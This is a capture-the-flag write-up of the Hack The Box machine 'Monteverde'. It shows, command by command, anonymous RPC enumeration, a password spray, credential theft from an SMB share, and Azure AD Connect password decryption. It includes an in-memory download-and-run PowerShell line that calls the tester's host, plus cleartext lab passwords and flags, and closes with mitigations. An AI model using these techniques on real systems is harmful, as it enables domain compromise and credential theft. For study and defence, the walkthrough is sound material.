# From Anonymous to Administrator: A Chain of Quiet Mistakes

From Anonymous RPC Enumeration to Domain Admin via Azure AD Connect

---

### From Anonymous to Administrator: A Chain of Quiet Mistakes

### From Anonymous RPC Enumeration to Domain Admin via Azure AD Connect

**Target:** *Monteverde (10.129.228.111) \[Hack The Box\]* **OS:** *Windows* **Difficulty:** *Medium* **Attack Vectors:** *Anonymous RPC Enumeration -\> Password Spray -\> SMB File Discovery -\> Azure AD Connect Credential Decryptio*n

![](https://cdn-images-1.medium.com/max/800/1*qkXMRunPCH3r3_bx-L-0vg.png)

### Executive Summary

**Assessment Date:** April 29, 2026 **Risk Level:** CRITICAL **Author:** R00t3dbyFa17h\Nicholas Mullenski

### Overview

An assessment of the “Monteverde” Domain Controller revealed a chain of misconfigurations that led to a full domain compromise. The DC permitted anonymous RPC enumeration of all domain accounts, a service account was protected by a trivially weak password, sensitive credential files were left exposed on an SMB share, and a member of the Azure Admins group was able to decrypt credentials stored in the local Azure AD Connect database — ultimately recovering the Domain Administrator’s password in cleartext.

### Key Findings:

- <span id="9f8d">**Anonymous RPC Enumeration:** The Domain Controller allowed null-session binds to RPC, exposing the full list of domain users including service accounts (SABatchJobs, AAD_987d7f2f57d2). This provided the attacker a username list with zero authentication required.</span>
- <span id="acca">**Weak Service Account Password:** The `SABatchJobs` account was configured with its own username as the password (SABatchJobs:SABatchJobs), discovered via a simple password spray. This provided the initial foothold into the domain.</span>
- <span id="930c">**Cleartext Credentials on SMB Share:** Post-foothold enumeration of the `users$` SMB share revealed an `azure.xml` credential file in mhope's home directory. The file contained mhope's plaintext password, allowing an upgrade to a WinRM shell and capture of the user flag.</span>
- <span id="6c98">**Azure AD Connect Credential Decryption:** The user `mhope` was a member of the `Azure Admins` group, granting query access to the local Azure AD Connect SQL database. Using a PowerShell script to query the encrypted password blob and decrypt it via the system's own `mcrypt.dll`, the on-prem synchronization account password (Domain Administrator) was recovered in cleartext.</span>

### Strategic Recommendation

Anonymous RPC enumeration must be disabled on Domain Controllers via the `RestrictAnonymous` and `RestrictAnonymousSAM` policies. All service accounts must enforce strong, unique passwords — ideally via Group Managed Service Accounts (gMSAs). Credential XML exports must never be saved to user-accessible file shares. Finally, the Azure AD Connect server should be treated as a Tier 0 asset, with strict membership controls on any group that has rights to query the ADSync database.

### 1.0 Initial Foothold

### 1.1 Enumeration & Reconnaissance

The objective of this phase was to identify the attack surface of the target machine and pinpoint specific service versions that may contain known vulnerabilities or misconfigurations.

**1.1.1 Nmap Scan** — A full TCP scan was performed first to identify open ports.

```
nmap 10.129.228.111
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-29 11:49 -0400
Nmap scan report for 10.129.228.111
Host is up (0.066s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

A version and script scan was then performed for deeper service identification.

```
nmap 10.129.228.111 -sCV -vvv

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-29 15:54:37Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Key Findings:**

- <span id="44f4">**Port 53 (DNS), 88 (Kerberos), 389/636 (LDAP/LDAPS), 3268/3269 (Global Catalog):** This combination of ports is the classic fingerprint of a **Domain Controller**.</span>
- <span id="242c">**Port 445 (SMB):** Primary target for share enumeration and authentication-based attacks.</span>
- <span id="b64c">**Port 5985 (WinRM):** Windows Remote Management. If valid credentials are obtained, this is the easiest path to a remote shell.</span>
- <span id="e5c5">**Hostname/Domain:** `MONTEVERDE` joined to `MEGABANK.LOCAL`.</span>

### 1.2 SMB & RPC Analysis

**1.2.1 SMB Anonymous Login** — A null-session SMB connection was attempted to enumerate shares without credentials.

```
smbclient -N -L //10.129.228.111
Anonymous login successful
Sharename       Type      Comment
 ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.228.111 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The anonymous bind succeeded but no shares were returned, meaning SMB browsing is locked down without credentials. However, the fact that null binds are accepted at all is a strong hint that RPC may be similarly permissive.

**1.2.2 RPCClient Enumeration** — A null-session RPC bind was attempted to enumerate domain user accounts.

```
rpcclient -U "" -N 10.129.228.111
rpcclient $> querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2 Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos Name: Dimitris Galanos Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest    Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope   Name: Mike Hope    Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary  Name: Ray O'Leary Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs  Name: SABatchJobs   Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan  Name: Sally Morgan Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata  Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec    Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp   Name: svc-netapp    Desc: (null)
rpcclient $>
```

This is a major win. We now have the full domain user list with zero credentials. Two accounts in particular stand out:

- <span id="baea">**AAD_987d7f2f57d2** — The `AAD_` prefix and description ("Service account for the Synchronization Service") confirms that **Azure AD Connect** is installed on this server. This is a critical piece of intel for the privilege escalation phase later.</span>
- <span id="bb60">**SABatchJobs** — Service Account for Batch Jobs. Service accounts are notorious for weak/predictable passwords.</span>

The usernames were saved to a file (`users.txt`) for use in the next phase.

### 1.3 Vulnerability Identification: Weak Service Account Credentials

A common misconfiguration in Active Directory environments is service accounts being deployed with their username as the password. This is trivial to test using a password spray where the user list is sprayed against itself.

### 2.0 Exploitation

### 2.1 Gaining a Foothold (Password Spray)

**2.1.1** With the user list extracted from RPC, NetExec was used to spray each username as a password against SMB. The `--continue-on-success` flag was used to ensure the spray did not stop on the first valid hit.

```
nxc smb 10.129.228.111 -u users.txt -p users.txt --continue-on-success
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
<snip>
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:SABatchJobs STATUS_LOGON_FAILURE
```

**Discovery:** The `SABatchJobs` account is configured with the password `SABatchJobs`. This is our foothold into the domain.

### 3.0 Internal Enumeration

### 3.1 SMB Share Discovery

**3.1.1** With valid credentials in hand, NetExec was used to enumerate the available SMB shares for `SABatchJobs`.

```
nxc smb 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs' --shares
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share
SMB         10.129.228.111  445    MONTEVERDE       users$          READ
```

Two non-default shares immediately stand out: **`azure_uploads`** and **`users$`**. The `users$` share typically holds individual user home directories — a common location for sensitive files — so it is investigated first.

**3.1.2** Listing the contents of the `users$` share:

```
nxc smb 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs' --share 'users$' --dir
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
SMB         10.129.228.111  445    MONTEVERDE       Perms    File Size      Date                          File Path
SMB         10.129.228.111  445    MONTEVERDE       -----    ---------      ----                          ---------
SMB         10.129.228.111  445    MONTEVERDE       dr--     0              Fri Jan  3 08:12:48 2020      .
SMB         10.129.228.111  445    MONTEVERDE       dr--     0              Fri Jan  3 08:12:48 2020      ..
SMB         10.129.228.111  445    MONTEVERDE       dr--     0              Fri Jan  3 08:15:23 2020      dgalanos
SMB         10.129.228.111  445    MONTEVERDE       dr--     0              Fri Jan  3 08:41:18 2020      mhope
SMB         10.129.228.111  445    MONTEVERDE       dr--     0              Fri Jan  3 08:14:56 2020      roleary
SMB         10.129.228.111  445    MONTEVERDE       dr--     0              Fri Jan  3 08:14:28 2020      smorgan
```

Four user folders are present. Rather than browsing each one manually, **smbmap** was used to recursively enumerate every file across all subdirectories.

### 3.2 Recursive File Search & Credential Discovery

**3.2.1** A recursive listing of the `users$` share was performed:

```
smbmap -H 10.129.228.111 -u SABatchJobs -p SABatchJobs -r 'users$' --depth 3
```

```
[-] Traversing shares...
[+] IP: 10.129.228.111:445  Name: 10.129.228.111        Status: Authenticated
   Disk                                                    Permissions Comment
 ----                                                    ----------- -------
 ADMIN$                                              NO ACCESS   Remote Admin
    azure_uploads                                       READ ONLY
    C$                                                  NO ACCESS   Default share
   E$                                                  NO ACCESS   Default share
   IPC$                                                READ ONLY   Remote IPC
  NETLOGON                                            READ ONLY   Logon server share
 SYSVOL                                              READ ONLY   Logon server share
 users$                                              READ ONLY
    ./users$
    dr--r--r--                0 Fri Jan  3 08:12:48 2020    .
   dr--r--r--                0 Fri Jan  3 08:12:48 2020    ..
  dr--r--r--                0 Fri Jan  3 08:15:23 2020    dgalanos
    dr--r--r--                0 Fri Jan  3 08:41:18 2020    mhope
   dr--r--r--                0 Fri Jan  3 08:14:56 2020    roleary
 dr--r--r--                0 Fri Jan  3 08:14:28 2020    smorgan
 ./users$//mhope
 dr--r--r--                0 Fri Jan  3 08:41:18 2020    .
   dr--r--r--                0 Fri Jan  3 08:41:18 2020    ..
  fw--w--w--             1212 Fri Jan  3 09:59:24 2020    azure.xml
```

**Discovery:** Across all four user home directories, only one file exists — **`azure.xml`** in `mhope`'s folder. Combined with the earlier intel that this server runs Azure AD Connect, this file is almost certainly going to contain credentials.

**3.2.2** The file was retrieved using smbclient with a targeted `get` command:

```
smbclient -U SABatchJobs //10.129.228.111/users$ SABatchJobs -c 'get mhope/azure.xml azure.xml'
getting file \mhope\azure.xml of size 1212 as azure.xml (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
```

**3.2.3** The `azure.xml` file contains a PowerShell-serialized credential object holding mhope's password in cleartext.

![](https://cdn-images-1.medium.com/max/800/1*fneg5yhM8KzDahLfGODVig.png)

### 3.3 Validating Credentials and Getting a Shell

**3.3.1** The credentials were validated against WinRM using NetExec:

```
nxc winrm 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'
WINRM       10.129.228.111  5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
WINRM       10.129.228.111  5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
```

The `(Pwn3d!)` indicator confirms WinRM access. A shell was established with Evil-WinRM and the user flag was retrieved.

```
evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
```

```
*Evil-WinRM* PS C:\Users\mhope\Desktop> type user.txt
6ac31369ee9b2831c3f790425e56ccf3
```

**User Flag Captured:** `6ac31369ee9b2831c3f790425e56ccf3`

### 4.0 Privilege Escalation

### 4.1 Identifying the Vector

**4.1.1** Once the shell was established as `mhope`, enumeration was performed to identify the user's privileges and group memberships.

```
*Evil-WinRM* PS C:\Users\mhope\Desktop> whoami /priv
```

```
PRIVILEGES INFORMATION
---
```

```
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```
*Evil-WinRM* PS C:\Users\mhope\Desktop> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never
```

```
Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No
```

```
Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   1/3/2020 6:29:59 AM
```

```
Logon hours allowed          All
```

```
Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.
```

**Key Discovery:** `mhope` is a member of the **Azure Admins** group. This group typically has permissions to manage the synchronization service, which includes interacting with its local SQL database where the AD-to-Azure replication account credentials are stored.

### 4.2 Locating the Azure AD Connect Service

**4.2.1** Confirming that Azure AD Connect and its supporting components are installed on the server.

```
*Evil-WinRM* PS C:\> cd "Program Files"
*Evil-WinRM* PS C:\Program Files> ls
```

```
    Directory: C:\Program Files
```

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:38 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
d-----         1/3/2020   5:28 AM                PackageManagement
d-----         1/2/2020   9:37 PM                VMware
d-r---         1/2/2020   2:46 PM                Windows Defender
d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----         1/2/2020   2:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         1/2/2020   2:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----         1/3/2020   5:28 AM                WindowsPowerShell
```

The presence of the `Microsoft Azure AD Sync` and `Microsoft SQL Server` directories confirms a local SQL instance (ADSync) is running and is used to store credentials for cloud synchronization.

### 4.3 Exploit Logic

Azure AD Connect uses a local SQL database to store the encrypted credentials for the on-prem account that handles AD-to-Azure replication. The catch is that the **decryption keys are stored on the same machine** — they have to be, because the service needs to decrypt the credentials at runtime to function.

Because `mhope` is in the Azure Admins group, we have the rights required to query this database directly.

The PowerShell PoC performs the following steps:

1.  <span id="a269">Queries the ADSync database for the encrypted password blob and the unique entropy/key material.</span>
2.  <span id="575f">Loads the native `mcrypt.dll` (located in the Sync `bin` folder) — the same library the legitimate service uses.</span>
3.  <span id="f376">Decrypts the blob into plaintext using the extracted keys.</span>

In other words: we are not breaking the encryption. We are asking the system to decrypt its own secrets for us.

### 4.4 Execute and Elevate

**4.4.1** The PowerShell PoC was saved locally as `getcreds.ps1` and hosted via a simple Python web server.

```
python3 -m  http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**4.4.2** The script was downloaded and executed in-memory inside the WinRM shell:

```
iex(new-object net.webclient).downloadstring('http://10.10.14.149/getcreds.ps1')
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

**Recovered Credentials:**

- <span id="84c5">**Username:** administrator</span>
- <span id="a334">**Password:** `d0m@in4dminyeah!`</span>

### 4.5 Gaining Administrator Access

**4.5.1** With the Domain Administrator credentials in hand, a new Evil-WinRM session was opened to retrieve the root flag.

```
evil-winrm -i 10.129.228.111 -u administrator -p 'd0m@in4dminyeah!'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator>  cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
dc3462bf57471b85a30c4afa01005b78
```

**Root Flag Captured:** `dc3462bf57471b85a30c4afa01005b78`

### 5.0 Lessons Learned & Mitigation

- <span id="11e8">**Anonymous RPC Enumeration:** The Domain Controller permitted null-session binds to RPC, leaking the entire user list. Administrators must enforce `RestrictAnonymous` and `RestrictAnonymousSAM` registry policies on all DCs to block this disclosure.</span>
- <span id="24a9">**Weak Service Account Password:** The `SABatchJobs` account was deployed with its username as the password. Service accounts must use strong, unique, and ideally rotated passwords. Group Managed Service Accounts (gMSAs) eliminate this risk by automating password management.</span>
- <span id="793e">**Cleartext Credentials on a File Share:** A PowerShell `Export-Clixml` credential file containing mhope's plaintext password was left in a user-accessible SMB share. Sensitive credentials must never be stored on shared paths, and credential exports should be encrypted with DPAPI bound to a specific user/host context only.</span>
- <span id="7000">**Azure AD Connect Privilege Escalation:** Membership in the Azure Admins group effectively granted access to the on-prem synchronization account — which is functionally equivalent to Domain Administrator. The Azure AD Connect server must be treated as a Tier 0 asset, with strict membership controls on any group that has rights to query the ADSync database.</span>

### 5.1 Spiritual Connection

**Obadiah 1:3–4**

> *“The pride of your heart has deceived you, you who live in the clefts of the rock, in your lofty dwelling, who say in your heart, ‘Who will bring me down to the ground?’ Though you soar aloft like the eagle, though your nest is set among the stars, from there I will bring you down, declares the LORD.”*

Edom built its cities into the cliffs and believed the altitude made them untouchable. Monteverde was the same story in a different language — a Domain Controller sitting at the top of the trust hierarchy, brought down not by a zero-day but by small, prideful assumptions. *We’re a DC, nobody can enumerate us. We’re an internal share, nobody will look. We’re a sync account, nobody can decrypt us.* Every layer of this box fell because someone trusted elevation to do the work that discipline was supposed to do.

The same trap waits for us spiritually. The higher we climb — in knowledge, in skill, in ministry, in walk — the more we’re tempted to believe our position protects us. It doesn’t. Pride is the null session of the soul: a quiet door we forget to close because we can’t imagine anyone walking through it. Draw near to God in the small things, the unglamorous audits of the heart, the parts nobody sees. *“God opposes the proud but gives grace to the humble”* (James 4:6). The eagle’s nest doesn’t save you. Humility does.

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [May 4, 2026](https://medium.com/p/55d0daf90bf9).

<a href="https://medium.com/@nicholasmullenski/from-anonymous-to-administrator-a-chain-of-quiet-mistakes-55d0daf90bf9" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
